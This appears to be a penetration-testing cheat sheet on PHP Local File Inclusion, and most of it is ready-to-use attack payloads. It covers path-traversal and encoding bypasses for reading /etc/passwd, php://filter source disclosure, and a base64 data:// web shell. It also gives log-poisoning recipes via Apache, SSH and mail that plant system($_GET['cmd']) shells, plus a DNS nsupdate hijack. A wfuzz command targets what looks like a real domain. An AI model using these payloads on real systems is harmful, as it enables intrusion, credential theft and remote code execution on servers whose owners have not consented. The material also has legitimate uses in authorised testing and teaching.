# LFI

## Local File Inclusions (LFI)

<details>

<summary>What is LFI ?</summary>

An attacker can use **Local File Inclusion** (LFI) to trick the web application into exposing or running files on the web server. An LFI attack may lead to information disclosure, remote code execution, or even XSS.

Typically, LFI occurs when an application uses the **path to a file as input**. If the application treats this input as trusted, a local file may be used in the include statement.

</details>

### Check for LFI

The following is an example of **PHP code that is vulnerable to LFI**.

```php
/**
* Get the filename from a GET input
* Example - http://example.com/?file=filename.php
*/
$file = $_GET['file'];

/**
* Unsafely include the file
* Example - filename.php
*/
include('directory/' . $file);
```

* **GET** parameter in url

{% embed url="https://github.com/kurobeats/fimap" %}
Tool to check LFI
{% endembed %}

### Payloads

```
http://example.com/index.php?page=../../../etc/passwd
http://example.thm.labs/page.php?file=/etc/passwd 

# NULL BYTE
http://example.thm.labs/page.php?file=../../../../../../etc/passwd%00 

# FILTER BYPASS TRICKS
http://example.com/index.php?page=....//....//etc/passwd
http://example.thm.labs/page.php?file=....//....//....//....//etc/passwd 
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd

# DOUBLE ENCODING
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00

# UTF-8 ENCODING
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
```

#### FUZZ LFI ENDPOINTS

```bash
wfuzz -c -w list-lfi.txt --hc 404,400 --hw 0 https://metabase.peren.fr/api/geojson?url=file:///FUZZ
```

### PHP Wrapper

* Used to read **.PHP files**. It is not possible to read a PHP file's content via LFI because PHP files get executed and never show the existing code. We can use the PHP filter to display the content of PHP files in other encoding formats such as base64 or ROT13.

**Commands**

```
http://example.com/page.php?file=php://filter/resource=/etc/passwd

http://example.com/page.php?file=php://filter/read=string.rot13/resource=/etc/passwd

http://example.com/page.php?file=php://filter/convert.base64-encode/resource=/etc/passwd

http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php

http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
```

## LFI 2 RCE

### /proc/self/environ

> Like a log file :

```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```

### Via Apache Log Files

```bash
# /var/log/apache2/access.log
# set inside the user agent or inside a GET parameter a php shell like :
<?php system($_GET['cmd']); ?>
# same for /proc/self/environ
```

### via SSH

```bash
ssh <?php system($_GET["cmd"]);?>@10.10.10.10
# Then include the SSH log files inside the Web Application :
# http://example.com/index.php?page=/var/log/auth.log&cmd=id
```

### via MAIL

> First send an email using the open SMTP then include the log file located at http://example.com/index.php?page=/var/log/mail.

```bash
root@kali:~# telnet 10.10.10.10. 25
Trying 10.10.10.10....
Connected to 10.10.10.10..
Escape character is '^]'.
220 straylight ESMTP Postfix (Debian/GNU)
helo ok
250 straylight
mail from: mail@example.com
250 2.1.0 Ok
rcpt to: root
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
subject: <?php echo system($_GET["cmd"]); ?>
data2
.
```

> In some cases you can also send the email with the mail command line.

```bash
mail -s "<?php system($_GET['cmd']);?>" www-data@10.10.10.10. < /dev/null
```

### Via DNS

> Check for :&#x20;
>
> ```
> /etc/bind/named.conf
> ```

**Change the DNS record via nsupdate**

```bash
nsupdate
> server $ip_target $port_dns_target
> key $key_algorithm:$name_key $secret
> zone $dns_name
> update add mail.$target_domain 86400 A $ip_host
> send

# start python smtpd server to receive mail
python3 -m smtpd -c DebuggingServer -n $ip_host:25
```
